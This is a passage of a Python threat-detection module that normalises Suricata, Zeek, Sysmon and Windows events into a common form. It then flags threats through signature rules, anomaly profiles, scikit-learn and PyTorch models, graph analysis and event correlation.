"""
Threat Detection Module

This module provides comprehensive threat detection capabilities including:
- Multi-source log analysis and correlation
- Machine learning-based anomaly detection  
- Signature-based threat detection
- Graph analytics for advanced persistent threats
- Real-time monitoring and alerting
- Behavioral analysis and user activity monitoring
"""

import json
import pandas as pd
import numpy as np
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any, Set
from dataclasses import dataclass, asdict
from pathlib import Path
import logging
import sqlite3
from collections import defaultdict, deque
import hashlib
import re
from enum import Enum
import asyncio
import threading
import time

# ML imports
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.preprocessing import StandardScaler, LabelEncoder
from sklearn.cluster import DBSCAN
from sklearn.decomposition import PCA
from sklearn.metrics import accuracy_score, precision_score, recall_score
import torch
import torch.nn as nn
import networkx as nx

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class AlertSeverity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"  
    LOW = "low"
    INFO = "info"

class DetectionMethod(Enum):
    SIGNATURE = "signature"
    ANOMALY = "anomaly"
    ML_MODEL = "ml_model"
    GRAPH_ANALYSIS = "graph_analysis"
    CORRELATION = "correlation"
    BEHAVIORAL = "behavioral"

@dataclass
class ThreatAlert:
    """Threat detection alert"""
    alert_id: str
    title: str
    description: str
    severity: AlertSeverity
    confidence: float
    detection_method: DetectionMethod
    source_systems: List[str]
    indicators: List[str]
    affected_assets: List[str]
    timestamp: datetime
    first_seen: datetime
    last_seen: datetime
    event_count: int
    raw_events: List[Dict[str, Any]]
    mitre_tactics: List[str]
    mitre_techniques: List[str]
    false_positive_likelihood: float
    recommended_actions: List[str]

@dataclass
class DetectionRule:
    """Detection rule definition"""
    rule_id: str
    name: str
    description: str
    rule_type: str
    detection_logic: Dict[str, Any]
    severity: AlertSeverity
    enabled: bool
    confidence_threshold: float
    time_window: int  # minutes
    event_threshold: int
    false_positive_rate: float
    created_at: datetime
    updated_at: datetime
    last_triggered: Optional[datetime]
    trigger_count: int

@dataclass
class AnomalyProfile:
    """Anomaly detection profile for assets/users"""
    profile_id: str
    entity_id: str
    entity_type: str  # user, host, network, application
    baseline_features: Dict[str, float]
    anomaly_threshold: float
    learning_period_days: int
    last_updated: datetime
    anomaly_history: List[Dict[str, Any]]

@dataclass
class ThreatEvent:
    """Raw security event for analysis"""
    event_id: str
    timestamp: datetime
    event_type: str
    source_system: str
    source_ip: str
    destination_ip: Optional[str]
    user_account: Optional[str]
    process_name: Optional[str]
    command_line: Optional[str]
    file_path: Optional[str]
    network_protocol: Optional[str]
    event_data: Dict[str, Any]
    normalized_fields: Dict[str, Any]

class NeuralThreatDetector(nn.Module):
    """Neural network for threat detection"""
    
    def __init__(self, input_size: int, hidden_size: int = 128):
        super(NeuralThreatDetector, self).__init__()
        self.hidden_size = hidden_size
        
        # LSTM for sequence analysis
        self.lstm = nn.LSTM(input_size, hidden_size, batch_first=True)
        
        # Attention mechanism
        self.attention = nn.Linear(hidden_size, 1)
        
        # Classification layers
        self.classifier = nn.Sequential(
            nn.Linear(hidden_size, hidden_size // 2),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(hidden_size // 2, hidden_size // 4),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(hidden_size // 4, 2)  # Binary classification
        )
        
        # Anomaly scoring layer
        self.anomaly_scorer = nn.Linear(hidden_size, 1)
    
    def forward(self, x):
        # x shape: (batch_size, sequence_length, input_size)
        lstm_out, (hidden, cell) = self.lstm(x)
        
        # Apply attention
        attention_weights = torch.softmax(self.attention(lstm_out), dim=1)
        attended_features = torch.sum(lstm_out * attention_weights, dim=1)
        
        # Classification
        threat_logits = self.classifier(attended_features)
        
        # Anomaly score
        anomaly_score = torch.sigmoid(self.anomaly_scorer(attended_features))
        
        return threat_logits, anomaly_score

class ThreatDetectionEngine:
    """
    Advanced Threat Detection Engine
    
    Provides comprehensive threat detection capabilities including:
    - Real-time event processing and correlation
    - Machine learning-based anomaly detection
    - Signature-based threat detection
    - Graph analytics for APT detection
    - Behavioral analysis and profiling
    """
    
    def __init__(self, data_dir: str = "../../../", config_path: str = None):
        self.data_dir = Path(data_dir)
        self.config_path = config_path
        
        # Initialize local storage
        self.db_path = self.data_dir / "threat_detection.db"
        self._init_local_db()
        
        # Load configuration
        self.config = self._load_config()
        
        # Initialize detection components
        self.detection_rules = {}
        self.anomaly_profiles = {}
        self.threat_alerts = {}
        self.event_buffer = deque(maxlen=10000)  # Ring buffer for events
        
        # Initialize ML models
        self.ml_models = {
            'anomaly_detector': IsolationForest(contamination=0.1, random_state=42),
            'threat_classifier': RandomForestClassifier(n_estimators=100, random_state=42),
            'scaler': StandardScaler(),
            'label_encoder': LabelEncoder()
        }
        
        # Initialize neural network
        self.neural_detector = None
        self._init_neural_detector()
        
        # Event processing
        self.processing_thread = None
        self.is_processing = False
        
        # Load existing data
        self._load_detection_data()
        
        # Start real-time processing
        self.start_real_time_processing()
        
        logger.info("Threat Detection Engine initialized")
    
    def _init_local_db(self):
        """Initialize local SQLite database for detection data"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Threat alerts table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS threat_alerts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                alert_id TEXT UNIQUE NOT NULL,
                title TEXT,
                description TEXT,
                severity TEXT,
                confidence REAL,
                detection_method TEXT,
                source_systems_json TEXT,
                indicators_json TEXT,
                affected_assets_json TEXT,
                timestamp TEXT,
                first_seen TEXT,
                last_seen TEXT,
                event_count INTEGER,
                mitre_tactics_json TEXT,
                mitre_techniques_json TEXT,
                false_positive_likelihood REAL,
                recommended_actions_json TEXT,
                status TEXT DEFAULT 'open',
                raw_events_json TEXT
            )
        ''')
        
        # Detection rules table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS detection_rules (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                rule_id TEXT UNIQUE NOT NULL,
                name TEXT,
                description TEXT,
                rule_type TEXT,
                detection_logic_json TEXT,
                severity TEXT,
                enabled INTEGER,
                confidence_threshold REAL,
                time_window INTEGER,
                event_threshold INTEGER,
                false_positive_rate REAL,
                created_at TEXT,
                updated_at TEXT,
                last_triggered TEXT,
                trigger_count INTEGER DEFAULT 0
            )
        ''')
        
        # Anomaly profiles table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS anomaly_profiles (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                profile_id TEXT UNIQUE NOT NULL,
                entity_id TEXT,
                entity_type TEXT,
                baseline_features_json TEXT,
                anomaly_threshold REAL,
                learning_period_days INTEGER,
                last_updated TEXT,
                anomaly_history_json TEXT
            )
        ''')
        
        # Raw events table (for short-term storage and correlation)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS raw_events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                event_id TEXT,
                timestamp TEXT,
                event_type TEXT,
                source_system TEXT,
                source_ip TEXT,
                destination_ip TEXT,
                user_account TEXT,
                process_name TEXT,
                command_line TEXT,
                file_path TEXT,
                network_protocol TEXT,
                event_data_json TEXT,
                normalized_fields_json TEXT,
                processed INTEGER DEFAULT 0,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Detection statistics table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS detection_stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                stat_date TEXT,
                total_events INTEGER,
                alerts_generated INTEGER,
                true_positives INTEGER,
                false_positives INTEGER,
                detection_accuracy REAL,
                avg_response_time REAL
            )
        ''')
        
        # Create indexes for performance
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_alerts_timestamp ON threat_alerts(timestamp)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_events_timestamp ON raw_events(timestamp)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_events_processed ON raw_events(processed)')
        
        conn.commit()
        conn.close()
    
    def _load_config(self) -> Dict[str, Any]:
        """Load detection configuration"""
        default_config = {
            'processing_batch_size': 100,
            'correlation_window_minutes': 15,
            'anomaly_threshold': 0.7,
            'min_confidence_for_alert': 0.6,
            'max_events_per_second': 1000,
            'alert_suppression_minutes': 60,
            'ml_model_retrain_hours': 24,
            'feature_extraction': {
                'enable_network_features': True,
                'enable_process_features': True,
                'enable_file_features': True,
                'enable_user_features': True
            },
            'data_sources': {
                'suricata_enabled': True,
                'zeek_enabled': True, 
                'sysmon_enabled': True,
                'windows_events_enabled': True,
                'linux_audit_enabled': True
            }
        }
        
        # Load user configuration if available
        # (Implementation similar to prevention module)
        
        return default_config
    
    def _load_detection_data(self):
        """Load existing detection data from database"""
        try:
            conn = sqlite3.connect(self.db_path)
            
            # Load detection rules
            rules_df = pd.read_sql_query("SELECT * FROM detection_rules WHERE enabled = 1", conn)
            for _, row in rules_df.iterrows():
                rule = DetectionRule(
                    rule_id=row['rule_id'],
                    name=row['name'],
                    description=row['description'],
                    rule_type=row['rule_type'],
                    detection_logic=json.loads(row['detection_logic_json']),
                    severity=AlertSeverity(row['severity']),
                    enabled=bool(row['enabled']),
                    confidence_threshold=row['confidence_threshold'],
                    time_window=row['time_window'],
                    event_threshold=row['event_threshold'],
                    false_positive_rate=row['false_positive_rate'],
                    created_at=datetime.fromisoformat(row['created_at']),
                    updated_at=datetime.fromisoformat(row['updated_at']),
                    last_triggered=datetime.fromisoformat(row['last_triggered']) if row['last_triggered'] else None,
                    trigger_count=row['trigger_count']
                )
                self.detection_rules[row['rule_id']] = rule
            
            # Load anomaly profiles
            profiles_df = pd.read_sql_query("SELECT * FROM anomaly_profiles", conn)
            for _, row in profiles_df.iterrows():
                profile = AnomalyProfile(
                    profile_id=row['profile_id'],
                    entity_id=row['entity_id'],
                    entity_type=row['entity_type'],
                    baseline_features=json.loads(row['baseline_features_json']),
                    anomaly_threshold=row['anomaly_threshold'],
                    learning_period_days=row['learning_period_days'],
                    last_updated=datetime.fromisoformat(row['last_updated']),
                    anomaly_history=json.loads(row['anomaly_history_json'])
                )
                self.anomaly_profiles[row['profile_id']] = profile
            
            conn.close()
            logger.info(f"Loaded {len(self.detection_rules)} rules and {len(self.anomaly_profiles)} profiles")
            
        except Exception as e:
            logger.error(f"Error loading detection data: {e}")
    
    def _init_neural_detector(self):
        """Initialize neural network for threat detection"""
        try:
            # Determine input size based on feature extraction configuration
            input_size = self._calculate_feature_dimensions()
            
            self.neural_detector = NeuralThreatDetector(input_size)
            
            # Load pre-trained weights if available
            model_path = self.data_dir / "models" / "neural_detector.pth"
            if model_path.exists():
                self.neural_detector.load_state_dict(torch.load(model_path))
                logger.info("Loaded pre-trained neural detector model")
            else:
                logger.info("Initialized new neural detector model")
                
        except Exception as e:
            logger.error(f"Error initializing neural detector: {e}")
            self.neural_detector = None
    
    def start_real_time_processing(self):
        """Start real-time event processing thread"""
        if not self.is_processing:
            self.is_processing = True
            self.processing_thread = threading.Thread(target=self._process_events_loop, daemon=True)
            self.processing_thread.start()
            logger.info("Started real-time event processing")
    
    def stop_real_time_processing(self):
        """Stop real-time event processing"""
        self.is_processing = False
        if self.processing_thread:
            self.processing_thread.join(timeout=5)
        logger.info("Stopped real-time event processing")
    
    def ingest_event(self, event_data: Dict[str, Any]) -> str:
        """
        Ingest a security event for processing
        
        Args:
            event_data: Raw event data dictionary
            
        Returns:
            Event ID
        """
        # Generate event ID
        event_id = f"EVT_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}"
        
        # Normalize event data
        normalized_event = self._normalize_event(event_data)
        
        # Create ThreatEvent object
        threat_event = ThreatEvent(
            event_id=event_id,
            timestamp=datetime.fromisoformat(event_data.get('timestamp', datetime.now().isoformat())),
            event_type=normalized_event.get('event_type', 'unknown'),
            source_system=event_data.get('source_system', 'unknown'),
            source_ip=normalized_event.get('source_ip'),
            destination_ip=normalized_event.get('destination_ip'),
            user_account=normalized_event.get('user_account'),
            process_name=normalized_event.get('process_name'),
            command_line=normalized_event.get('command_line'),
            file_path=normalized_event.get('file_path'),
            network_protocol=normalized_event.get('network_protocol'),
            event_data=event_data,
            normalized_fields=normalized_event
        )
        
        # Add to buffer for processing
        self.event_buffer.append(threat_event)
        
        # Store in database
        self._store_raw_event(threat_event)
        
        return event_id
    
    def create_detection_rule(self, name: str, description: str, rule_type: str,
                            detection_logic: Dict[str, Any], severity: AlertSeverity,
                            confidence_threshold: float = 0.8, time_window: int = 15,
                            event_threshold: int = 1) -> str:
        """
        Create a new detection rule
        
        Args:
            name: Rule name
            description: Rule description  
            rule_type: Type of rule (signature, correlation, anomaly, etc.)
            detection_logic: Rule logic and conditions
            severity: Alert severity for matches
            confidence_threshold: Minimum confidence to trigger alert
            time_window: Time window in minutes for correlation
            event_threshold: Minimum events to trigger alert
            
        Returns:
            Rule ID
        """
        rule_id = f"RULE_{hashlib.md5(f'{name}_{rule_type}'.encode()).hexdigest()[:8]}"
        
        rule = DetectionRule(
            rule_id=rule_id,
            name=name,
            description=description,
            rule_type=rule_type,
            detection_logic=detection_logic,
            severity=severity,
            enabled=True,
            confidence_threshold=confidence_threshold,
            time_window=time_window,
            event_threshold=event_threshold,
            false_positive_rate=0.1,  # Initial estimate
            created_at=datetime.now(),
            updated_at=datetime.now(),
            last_triggered=None,
            trigger_count=0
        )
        
        self.detection_rules[rule_id] = rule
        self._cache_detection_rule(rule)
        
        logger.info(f"Created detection rule {rule_id}: {name}")
        return rule_id
    
    def create_anomaly_profile(self, entity_id: str, entity_type: str,
                             baseline_data: List[Dict[str, Any]],
                             learning_period_days: int = 30) -> str:
        """
        Create anomaly detection profile for an entity
        
        Args:
            entity_id: ID of entity to profile
            entity_type: Type of entity (user, host, network, application)
            baseline_data: Historical data for baseline creation
            learning_period_days: Days of data to use for learning
            
        Returns:
            Profile ID
        """
        profile_id = f"PROF_{hashlib.md5(f'{entity_type}_{entity_id}'.encode()).hexdigest()[:8]}"
        
        # Extract features from baseline data
        baseline_features = self._extract_baseline_features(baseline_data, entity_type)
        
        # Calculate anomaly threshold based on statistical analysis
        anomaly_threshold = self._calculate_anomaly_threshold(baseline_features)
        
        profile = AnomalyProfile(
            profile_id=profile_id,
            entity_id=entity_id,
            entity_type=entity_type,
            baseline_features=baseline_features,
            anomaly_threshold=anomaly_threshold,
            learning_period_days=learning_period_days,
            last_updated=datetime.now(),
            anomaly_history=[]
        )
        
        self.anomaly_profiles[profile_id] = profile
        self._cache_anomaly_profile(profile)
        
        logger.info(f"Created anomaly profile {profile_id} for {entity_type}:{entity_id}")
        return profile_id
    
    def detect_threats_in_events(self, events: List[ThreatEvent]) -> List[ThreatAlert]:
        """
        Analyze events for threats using all detection methods
        
        Args:
            events: List of threat events to analyze
            
        Returns:
            List of threat alerts generated
        """
        alerts = []
        
        if not events:
            return alerts
        
        # 1. Signature-based detection
        signature_alerts = self._detect_with_signatures(events)
        alerts.extend(signature_alerts)
        
        # 2. Anomaly detection
        anomaly_alerts = self._detect_anomalies(events)
        alerts.extend(anomaly_alerts)
        
        # 3. ML-based detection
        ml_alerts = self._detect_with_ml(events)
        alerts.extend(ml_alerts)
        
        # 4. Graph analysis for APTs
        graph_alerts = self._detect_with_graph_analysis(events)
        alerts.extend(graph_alerts)
        
        # 5. Behavioral analysis
        behavioral_alerts = self._detect_behavioral_anomalies(events)
        alerts.extend(behavioral_alerts)
        
        # 6. Correlation analysis
        correlation_alerts = self._correlate_events(events)
        alerts.extend(correlation_alerts)
        
        # Deduplicate and prioritize alerts
        alerts = self._deduplicate_alerts(alerts)
        alerts = self._prioritize_alerts(alerts)
        
        # Store alerts
        for alert in alerts:
            self.threat_alerts[alert.alert_id] = alert
            self._cache_threat_alert(alert)
        
        logger.info(f"Generated {len(alerts)} threat alerts from {len(events)} events")
        return alerts
    
    def get_real_time_statistics(self) -> Dict[str, Any]:
        """
        Get real-time detection statistics
        
        Returns:
            Statistics dictionary
        """
        current_time = datetime.now()
        last_hour = current_time - timedelta(hours=1)
        
        # Query recent events and alerts
        conn = sqlite3.connect(self.db_path)
        
        # Event statistics
        event_stats = pd.read_sql_query('''
            SELECT COUNT(*) as total_events,
                   COUNT(DISTINCT event_type) as unique_event_types,
                   COUNT(DISTINCT source_system) as source_systems
            FROM raw_events 
            WHERE timestamp > ?
        ''', conn, params=(last_hour.isoformat(),))
        
        # Alert statistics
        alert_stats = pd.read_sql_query('''
            SELECT COUNT(*) as total_alerts,
                   severity,
                   COUNT(*) as count_by_severity
            FROM threat_alerts 
            WHERE timestamp > ?
            GROUP BY severity
        ''', conn, params=(last_hour.isoformat(),))
        
        conn.close()
        
        stats = {
            'timestamp': current_time.isoformat(),
            'events_last_hour': int(event_stats['total_events'].iloc[0]) if not event_stats.empty else 0,
            'unique_event_types': int(event_stats['unique_event_types'].iloc[0]) if not event_stats.empty else 0,
            'source_systems': int(event_stats['source_systems'].iloc[0]) if not event_stats.empty else 0,
            'alerts_by_severity': alert_stats.set_index('severity')['count_by_severity'].to_dict() if not alert_stats.empty else {},
            'total_active_rules': len([r for r in self.detection_rules.values() if r.enabled]),
            'total_anomaly_profiles': len(self.anomaly_profiles),
            'event_buffer_size': len(self.event_buffer),
            'processing_status': 'active' if self.is_processing else 'stopped'
        }
        
        return stats
    
    def train_ml_models(self, training_data: List[Dict[str, Any]] = None) -> Dict[str, float]:
        """
        Train machine learning models for threat detection
        
        Args:
            training_data: Optional training data, if None uses recent events
            
        Returns:
            Training metrics
        """
        if training_data is None:
            training_data = self._prepare_training_data()
        
        if not training_data:
            logger.warning("No training data available")
            return {}
        
        # Prepare feature matrix
        X, y = self._prepare_feature_matrix(training_data)
        
        if len(X) < 100:  # Minimum samples for training
            logger.warning("Insufficient training data")
            return {}
        
        # Split data
        split_idx = int(len(X) * 0.8)
        X_train, X_test = X[:split_idx], X[split_idx:]
        y_train, y_test = y[:split_idx], y[split_idx:]
        
        # Scale features
        X_train_scaled = self.ml_models['scaler'].fit_transform(X_train)
        X_test_scaled = self.ml_models['scaler'].transform(X_test)
        
        # Train anomaly detector
        self.ml_models['anomaly_detector'].fit(X_train_scaled)
        
        # Train threat classifier
        self.ml_models['threat_classifier'].fit(X_train_scaled, y_train)
        
        # Evaluate models
        y_pred_anomaly = self.ml_models['anomaly_detector'].predict(X_test_scaled)
        y_pred_classifier = self.ml_models['threat_classifier'].predict(X_test_scaled)
        
        metrics = {
            'anomaly_accuracy': accuracy_score(y_test, (y_pred_anomaly == -1).astype(int)),
            'classifier_accuracy': accuracy_score(y_test, y_pred_classifier),
            'classifier_precision': precision_score(y_test, y_pred_classifier, average='weighted'),
            'classifier_recall': recall_score(y_test, y_pred_classifier, average='weighted'),
            'training_samples': len(X_train),
            'test_samples': len(X_test)
        }
        
        # Train neural network if available
        if self.neural_detector:
            neural_metrics = self._train_neural_detector(X_train_scaled, y_train, X_test_scaled, y_test)
            metrics.update(neural_metrics)
        
        logger.info(f"ML models trained with accuracy: {metrics.get('classifier_accuracy', 0):.3f}")
        return metrics
    
    def update_anomaly_profiles(self) -> int:
        """
        Update anomaly profiles with recent data
        
        Returns:
            Number of profiles updated
        """
        updated_count = 0
        current_time = datetime.now()
        
        for profile_id, profile in self.anomaly_profiles.items():
            # Check if profile needs updating
            if (current_time - profile.last_updated).days >= 1:  # Daily updates
                
                # Get recent data for entity
                recent_data = self._get_recent_entity_data(profile.entity_id, profile.entity_type)
                
                if recent_data:
                    # Update baseline features
                    new_features = self._extract_baseline_features(recent_data, profile.entity_type)
                    
                    # Merge with existing baseline (exponential moving average)
                    alpha = 0.1  # Learning rate
                    for feature, new_value in new_features.items():
                        if feature in profile.baseline_features:
                            profile.baseline_features[feature] = (
                                alpha * new_value + (1 - alpha) * profile.baseline_features[feature]
                            )
                        else:
                            profile.baseline_features[feature] = new_value
                    
                    # Update threshold if needed
                    profile.anomaly_threshold = self._calculate_anomaly_threshold(profile.baseline_features)
                    profile.last_updated = current_time
                    
                    # Cache updated profile
                    self._cache_anomaly_profile(profile)
                    updated_count += 1
        
        logger.info(f"Updated {updated_count} anomaly profiles")
        return updated_count
    
    # Event processing methods
    
    def _process_events_loop(self):
        """Main event processing loop"""
        batch_size = self.config['processing_batch_size']
        
        while self.is_processing:
            try:
                # Process events in batches
                events_to_process = []
                
                # Collect batch of events
                while len(events_to_process) < batch_size and self.event_buffer:
                    events_to_process.append(self.event_buffer.popleft())
                
                # Process batch if we have events
                if events_to_process:
                    alerts = self.detect_threats_in_events(events_to_process)
                    
                    # Handle generated alerts
                    for alert in alerts:
                        self._handle_alert(alert)
                
                # Sleep briefly to prevent excessive CPU usage
                time.sleep(0.1)
                
            except Exception as e:
                logger.error(f"Error in event processing loop: {e}")
                time.sleep(1)
    
    def _normalize_event(self, event_data: Dict[str, Any]) -> Dict[str, Any]:
        """Normalize raw event data to standard format"""
        normalized = {}
        
        # Extract common fields based on event type and source
        source_system = event_data.get('source_system', '').lower()
        
        if 'suricata' in source_system:
            normalized = self._normalize_suricata_event(event_data)
        elif 'zeek' in source_system:
            normalized = self._normalize_zeek_event(event_data)
        elif 'sysmon' in source_system:
            normalized = self._normalize_sysmon_event(event_data)
        elif 'windows' in source_system:
            normalized = self._normalize_windows_event(event_data)
        else:
            # Generic normalization
            normalized = self._normalize_generic_event(event_data)
        
        return normalized
    
    def _normalize_suricata_event(self, event_data: Dict[str, Any]) -> Dict[str, Any]:
        """Normalize Suricata IDS event"""
        return {
            'event_type': event_data.get('event_type', 'network'),
            'source_ip': event_data.get('src_ip'),
            'destination_ip': event_data.get('dest_ip'),
            'source_port': event_data.get('src_port'),
            'destination_port': event_data.get('dest_port'),
            'network_protocol': event_data.get('proto'),
            'signature_id': event_data.get('alert', {}).get('signature_id'),
            'signature_name': event_data.get('alert', {}).get('signature'),
            'severity': event_data.get('alert', {}).get('severity')
        }
    
    def _normalize_zeek_event(self, event_data: Dict[str, Any]) -> Dict[str, Any]:
        """Normalize Zeek network event"""
        return {
            'event_type': 'network',
            'source_ip': event_data.get('id.orig_h'),
            'destination_ip': event_data.get('id.resp_h'), 
            'source_port': event_data.get('id.orig_p'),
            'destination_port': event_data.get('id.resp_p'),
            'network_protocol': event_data.get('proto'),
            'connection_state': event_data.get('conn_state'),
            'bytes_sent': event_data.get('orig_bytes'),
            'bytes_received': event_data.get('resp_bytes')
        }
    
    def _normalize_sysmon_event(self, event_data: Dict[str, Any]) -> Dict[str, Any]:
        """Normalize Sysmon event"""
        return {
            'event_type': 'process',
            'process_name': event_data.get('Image'),
            'command_line': event_data.get('CommandLine'),
            'process_id': event_data.get('ProcessId'),
            'parent_process_id': event_data.get('ParentProcessId'),
            'user_account': event_data.get('User'),
            'file_path': event_data.get('TargetFilename'),
            'network_connection': event_data.get('DestinationIp')
        }
    
    def _normalize_windows_event(self, event_data: Dict[str, Any]) -> Dict[str, Any]:
        """Normalize Windows security event"""
        return {
            'event_type': 'security',
            'event_id': event_data.get('EventID'),
            'user_account': event_data.get('TargetUserName'),
            'source_ip': event_data.get('IpAddress'),
            'logon_type': event_data.get('LogonType'),
            'authentication_package': event_data.get('AuthenticationPackageName')
        }
    
    def _normalize_generic_event(self, event_data: Dict[str, Any]) -> Dict[str, Any]:
        """Generic event normalization"""
        return {
            'event_type': event_data.get('event_type', 'unknown'),
            'source_ip': event_data.get('source_ip') or event_data.get('src_ip'),
            'destination_ip': event_data.get('destination_ip') or event_data.get('dst_ip'),
            'user_account': event_data.get('user') or event_data.get('username'),
            'process_name': event_data.get('process') or event_data.get('process_name'),
            'file_path': event_data.get('file') or event_data.get('file_path')
        }
    
    # Detection method implementations
    
    def _detect_with_signatures(self, events: List[ThreatEvent]) -> List[ThreatAlert]:
        """Signature-based threat detection"""
        alerts = []
        
        for event in events:
            for rule_id, rule in self.detection_rules.items():
                if not rule.enabled or rule.rule_type != 'signature':
                    continue
                
                if self._matches_signature_rule(event, rule):
                    alert = self._create_alert_from_rule(event, rule, DetectionMethod.SIGNATURE)
                    alerts.append(alert)
                    
                    # Update rule statistics
                    rule.trigger_count += 1
                    rule.last_triggered = datetime.now()
        
        return alerts
    
    def _detect_anomalies(self, events: List[ThreatEvent]) -> List[ThreatAlert]:
        """Anomaly-based threat detection"""
        alerts = []
        
        for event in events:
            # Check against anomaly profiles
            for profile_id, profile in self.anomaly_profiles.items():
                if self._event_matches_entity(event, profile):
                    
                    # Extract features from event
                    event_features = self._extract_event_features(event, profile.entity_type)
                    
                    # Calculate anomaly score
                    anomaly_score = self._calculate_anomaly_score(event_features, profile)
                    
                    if anomaly_score > profile.anomaly_threshold:
                        alert = self._create_anomaly_alert(event, profile, anomaly_score)
                        alerts.append(alert)
                        
                        # Add to anomaly history
                        profile.anomaly_history.append({
                            'timestamp': event.timestamp.isoformat(),
                            'anomaly_score': anomaly_score,
                            'features': event_features
                        })
        
        return alerts
    
    def _detect_with_ml(self, events: List[ThreatEvent]) -> List[ThreatAlert]:
        """Machine learning-based threat detection"""
        alerts = []
        
        if not events:
            return alerts
        
        try:
            # Extract features for all events
            feature_matrix = []
            for event in events:
                features = self._extract_ml_features(event)
                if features:
                    feature_matrix.append(features)
            
            if not feature_matrix:
                return alerts
            
            # Scale features
            X = np.array(feature_matrix)
            X_scaled = self.ml_models['scaler'].transform(X)
            
            # Anomaly detection
            anomaly_scores = self.ml_models['anomaly_detector'].decision_function(X_scaled)
            anomaly_predictions = self.ml_models['anomaly_detector'].predict(X_scaled)
            
            # Threat classification
            threat_probabilities = self.ml_models['threat_classifier'].predict_proba(X_scaled)
            
            # Neural network prediction if available
            neural_scores = None
            if self.neural_detector:
                neural_scores = self._predict_with_neural_detector(X_scaled)
            
            # Generate alerts for anomalies and high-confidence threats
            for i, event in enumerate(events[:len(anomaly_scores)]):
                
                # Check anomaly detection
                if anomaly_predictions[i] == -1:  # Anomaly detected
                    confidence = min(0.95, abs(anomaly_scores[i]) / 2.0)  # Normalize score
                    if confidence >= self.config['min_confidence_for_alert']:
                        alert = self._create_ml_alert(event, 'anomaly', confidence, DetectionMethod.ANOMALY)
                        alerts.append(alert)
                
                # Check threat classification
                if len(threat_probabilities[i]) > 1:
                    threat_confidence = threat_probabilities[i][1]  # Probability of threat class
                    if threat_confidence >= self.config['min_confidence_for_alert']:
                        alert = self._create_ml_alert(event, 'threat', threat_confidence, DetectionMethod.ML_MODEL)
                        alerts.append(alert)
                
                # Check neural network prediction
                if neural_scores and len(neural_scores) > i:
                    neural_confidence = neural_scores[i]
                    if neural_confidence >= self.config['min_confidence_for_alert']:
                        alert = self._create_ml_alert(event, 'neural_threat', neural_confidence, DetectionMethod.ML_MODEL)
                        alerts.append(alert)
            
        except Exception as e:
            logger.error(f"Error in ML detection: {e}")
        
        return alerts
    
    def _detect_with_graph_analysis(self, events: List[ThreatEvent]) -> List[ThreatAlert]:
        """Graph analysis for advanced persistent threat detection"""
        alerts = []
        
        try:
            # Build graph from events
            G = nx.DiGraph()
            
            for event in events:
                # Add nodes and edges based on event type
                if event.source_ip and event.destination_ip:
                    G.add_edge(event.source_ip, event.destination_ip, 
                              event_type=event.event_type, 
                              timestamp=event.timestamp,
                              weight=1)
                
                if event.user_account and event.source_ip:
                    G.add_edge(event.user_account, event.source_ip,
                              event_type='user_connection',
                              timestamp=event.timestamp,
                              weight=1)
            
            if len(G.nodes()) < 3:  # Need minimum nodes for analysis
                return alerts
            
            # Analyze graph for suspicious patterns
            suspicious_patterns = self._analyze_graph_patterns(G)
            
            for pattern in suspicious_patterns:
                # Create alert for suspicious graph pattern
                alert = self._create_graph_alert(pattern, events)
                alerts.append(alert)
                
        except Exception as e:
            logger.error(f"Error in graph analysis: {e}")
        
        return alerts
    
    def _detect_behavioral_anomalies(self, events: List[ThreatEvent]) -> List[ThreatAlert]:
        """Behavioral analysis for user and system activity"""
        alerts = []
        
        # Group events by user/system for behavioral analysis
        user_events = defaultdict(list)
        host_events = defaultdict(list)
        
        for event in events:
            if event.user_account:
                user_events[event.user_account].append(event)
            if event.source_ip:
                host_events[event.source_ip].append(event)
        
        # Analyze user behavior
        for user, user_event_list in user_events.items():
            behavioral_anomalies = self._analyze_user_behavior(user, user_event_list)
            for anomaly in behavioral_anomalies:
                alert = self._create_behavioral_alert(anomaly, user_event_list)
                alerts.append(alert)
        
        # Analyze host behavior
        for host, host_event_list in host_events.items():
            behavioral_anomalies = self._analyze_host_behavior(host, host_event_list)
            for anomaly in behavioral_anomalies:
                alert = self._create_behavioral_alert(anomaly, host_event_list)
                alerts.append(alert)
        
        return alerts
    
    def _correlate_events(self, events: List[ThreatEvent]) -> List[ThreatAlert]:
        """Event correlation for multi-stage attack detection"""
        alerts = []
        
        # Time-based correlation within window
        correlation_window = timedelta(minutes=self.config['correlation_window_minutes'])
        
        # Group events by time windows
        time_windows = defaultdict(list)
        
        for event in events:
            window_key = event.timestamp.replace(
                minute=(event.timestamp.minute // 15) * 15, 
                second=0, 
                microsecond=0
            )
            time_windows[window_key].append(event)
        
        # Analyze each time window for correlation patterns
        for window_time, window_events in time_windows.items():
            if len(window_events) < 2:  # Need multiple events to correlate
                continue
            
            correlations = self._find_event_correlations(window_events)
            
            for correlation in correlations:
                alert = self._create_correlation_alert(correlation, window_events)
                alerts.append(alert)
        
        return alerts
    
    # Helper methods for detection
    
    def _matches_signature_rule(self, event: ThreatEvent, rule: DetectionRule) -> bool:
        """Check if event matches signature rule"""
        logic = rule.detection_logic
        
        # Simple field matching logic
        for field, expected_value in logic.get('fields', {}).items():
            event_value = getattr(event, field, None) or event.normalized_fields.get(field)
            
            if isinstance(expected_value, str):
                if expected_value.startswith('*') and expected_value.endswith('*'):
                    # Wildcard matching
                    pattern = expected_value[1:-1]
                    if event_value and pattern not in str(event_value):
                        return False
